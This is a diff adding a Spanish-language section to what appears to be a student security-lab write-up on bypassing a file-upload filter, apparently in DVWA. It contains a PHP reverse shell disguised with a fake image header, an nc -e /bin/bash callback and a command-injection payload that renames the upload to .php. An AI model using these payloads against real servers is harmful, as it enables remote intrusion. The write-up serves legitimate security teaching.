@@ -57,3 +57,41 @@ Al igual que en el nivel anterior, podemos observar como se ha obtenido una shel
 ![challenge-1](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/challenge-1.png)
 
 ## Alto
+
+En este nivel, el servidor web solo permite subir archivos de tipo `jpeg` o `png` con la diferencia de que esta vez el servidor comprueba los primeros bytes del archivo para comprobar que el tipo de archivo es correcto.
+
+Para poder evadir esta comprobación, podemos utilizar la técnica de `file signature` para cambiar los primeros bytes del archivo y que el servidor web lo reconozca como un archivo de tipo `jpeg` o `png` para ello hemos escrito `GIF98` al comienzo de nuestra reverse shell.
+
+```php
+GIF98
+<?php
+
+$cmd = 'nc 127.0.0.1 4000 -e /bin/bash';
+system($cmd);
+
+?>
+```
+
+En la siguiente imagen podemos observar el contenido de nuestro fichero `shell.png` en un editor hexadecimal (`hexeditor`).
+
+![hexeditor](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/hexeditor.png)
+
+Una vez modificado el archivo, podemos subirlo al servidor web y comprobar que se ha subido correctamente.
+
+![uploaded-high](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/uploaded-h.png)
+
+Una vez subida, intentamos acceder a la shell mediante la uri que nos proporciona el servidor web y comprobamos que nos da un error como era de esperar.
+
+![error-2](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/error-2.png)
+
+Para lograr nuestro objetivo podemos intentar combinarlo con otra vulnerabilidad como es la `Command Injection` para poder acceder a la shell que hemos subido.
+
+Para ello, podemos utilizar la siguiente payload:
+
+```bash
+|mv ../../hackable/uploads/shell.png ../../hackable/uploads/shell.php
+```
+
+Una vez ejecutada la payload, podemos acceder a la shell mediante la uri que nos proporciona el servidor web y comprobar que tenemos acceso al sistema.
+
+![challenge](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/challenge-2.png)
